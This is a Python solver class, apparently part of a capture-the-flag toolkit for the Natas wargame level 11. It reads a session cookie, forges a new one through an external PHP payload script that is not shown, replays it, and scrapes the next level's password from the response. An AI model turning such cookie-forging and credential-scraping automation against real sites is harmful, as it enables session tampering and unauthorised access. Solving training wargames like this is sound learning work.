import re
import requests
import urllib.parse
from .base_solver import NatasSolver
from utils.php_runner import run_php_script

class Natas11Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # First get the cookie from the initial request
            init_response = self.make_request()
            if 'data' not in init_response.cookies:
                raise ValueError("No cookie received in initial response")
            
            # Get cookie and decode it
            encoded_cookie = init_response.cookies['data']
            decoded_cookie = urllib.parse.unquote(encoded_cookie)
            
            # Generate new cookie using PHP script
            new_cookie = run_php_script(
                "payloads/natas11.php",
                decoded_cookie
            )
            if not new_cookie:
                raise ValueError("Failed to generate cookie from PHP")

            print(f"[+] Generated new cookie: {new_cookie}")
            
            # Create new session and make request with forged cookie
            self.http_client.session = requests.Session()  # Reset session
            response = self.make_request(
                cookies={"data": new_cookie.strip()}
            )

            # Extract password
            match = re.findall(r"The password for natas12 is ([^<\s]+)", response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas11: {str(e)}")

